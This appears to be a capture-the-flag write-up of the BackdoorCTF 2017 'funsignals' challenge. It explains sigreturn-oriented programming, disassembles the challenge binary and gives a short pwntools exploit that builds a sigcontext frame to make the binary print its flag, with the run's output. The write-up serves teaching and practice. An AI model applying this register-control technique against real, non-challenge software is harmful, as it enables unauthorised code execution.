@@ -1,0 +1,107 @@
+#+TITLE: BackdoorCTF 2017: FUNSIGNALS
+#+DATE: <2017-09-24 Thu 12:01>
+#+TAGS: writeup, security, capture-the-flag, binary-exploitation, x86, linux
+
+"funsignals" was a 250 point binary exploitation challenge with 58 solves. The
+challenge itself was a very trivial example of sigreturn-oriented programming.
+
+Sigreturn-oriented programming is a means of getting values into certain
+registers without having to use ROP gadgets that pop values from the stack. It's
+a technique that relies on how UNIX-like operating systems implement signals -
+to quote an [[https://lwn.net/Articles/676803/][article from LWN on the subject]], "when a signal is delivered to a
+process, execution jumps to the designated signal handler; when the handler is
+done, control returns to the location where execution was interrupted. Signals
+are a form of software interrupt, and all of the usual interrupt-like accounting
+must be dealt with. In particular, before the kernel can deliver a signal, it
+must make a note of the current execution context, including the values stored
+in all of the processor registers."
+
+That "execution context" is quite simply a structure stored on the stack, which
+is colloquially known as the "sigcontext" structure and is defined in the
+architecture-specific headers of the Linux kernel. x86, for example is found at
+[[http://elixir.free-electrons.com/linux/latest/source/arch/x86/include/uapi/asm/sigcontext.h][=arch/x86/include/uapi/asm/sigcontext.h=]].
+
+We're given a small amd64 Linux binary for the challenge. Its code is only a few
+bytes long:
+
+#+BEGIN_SRC asm :hl_lines 0
+;-- _start:
+0x10000000      31c0           xorl %eax, %eax
+0x10000002      31ff           xorl %edi, %edi
+0x10000004      31d2           xorl %edx, %edx
+0x10000006      b604           movb $4, %dh
+0x10000008      4889e6         movq %rsp, %rsi
+0x1000000b      0f05           syscall
+0x1000000d      31ff           xorl %edi, %edi
+0x1000000f      6a0f           pushq $0xf
+0x10000011      58             popq %rax
+0x10000012      0f05           syscall
+0x10000014      cc             int3
+;-- syscall:
+0x10000015      0f05           syscall
+0x10000017      4831ff         xorq %rdi, %rdi
+0x1000001a      48c7c03c0000.  movq $0x3c, %rax
+0x10000021      0f05           syscall
+#+END_SRC
+
+Don't be intimidated by the use of the seemingly uncommon =syscall= instruction,
+the portion before the 'syscall' symbol is equivalent to the following C code.
+
+#+BEGIN_SRC c :hl_lines 0
+char buf[0x400];
+read(0, buf, 0x400);
+sigreturn();
+#+END_SRC
+
+=sigreturn(2)= is a system call you never use in practice, but as we mentioned
+earlier, the process needs to restore the context when it returns from a signal
+handler. This is how it's done. =sigreturn(2)= essentially pops the =sigcontext=
+structure from the stack and fills the proper registers. Also, that =int3=
+instruction should be a hint to us that we'll have to manipulate the instruction
+pointer, too, since the program would abort if we hit that.
+
+A few bytes following the binary's code is a string that sticks out like a sore
+thumb: ~fake_flag_here_as_original_is_at_server~. To get the flag, we're going to
+want to print out whatever's at that address, which we can do with the =sys_write=
+system call. We're going to want to load =0x01=, the syscall number for =sys_write=,
+into =%rax=, =0x01= into =%rdi= for =stdout=, =0x10000023= into =%rsi= for the address of
+the flag we want to print, and =0x29= into =%rdx= for the approximate length of the
+flag. Once the registers are all set up, we're going to want to invoke the
+kernel, so we'll set =%rip= to =0x10000015= - where there's a =syscall= instruction
+followed by a clean exit. To load all of those registers, we will fill out a
+sigcontext frame containing the values.
+
+Now, I would highly advise against manually packing the =sigcontext= structure,
+as there are a few undocumented fields that can and will cause segmentation
+faults coming from seemingly nowhere. [[https://docs.pwntools.com/en/stable/][pwntools]] provides the =pwnlib.rop.srop=
+package for creating sigcontext frames, and the API is simple enough to
+understand just from the exploit code.
+
+#+BEGIN_SRC python :hl_lines 0
+#!/usr/bin/env python
+
+from pwn import *
+
+
+SIGCONTEXT = SigreturnFrame(arch="amd64")
+SIGCONTEXT.rax = 0x01
+SIGCONTEXT.rdi = 0x01
+SIGCONTEXT.rsi = 0x10000023
+SIGCONTEXT.rdx = 0x29
+SIGCONTEXT.rip = 0x10000015
+
+proc = remote("163.172.176.29", 9034)
+proc.sendline(bytes(SIGCONTEXT))
+print(proc.recv())
+#+END_SRC
+
+#+BEGIN_SRC
+[jakob@Epsilon funsignals]$ ./exploit.py 
+[+] Opening connection to 163.172.176.29 on port 9034: Done
+b'flag{W3lc0m3_T0_th3_n3w_w0rld_OF_S1gn4l5}'
+[*] Closed connection to 163.172.176.29 port 9034
+#+END_SRC
+
+As an aside, you typically won't have an explicit call to =sigreturn(2)= in the
+binary. Sigreturn-oriented programming is most commonly combined with ROP, where
+a gadget to load =0xf= into =%rax= and a gadget to perform a syscall are used.
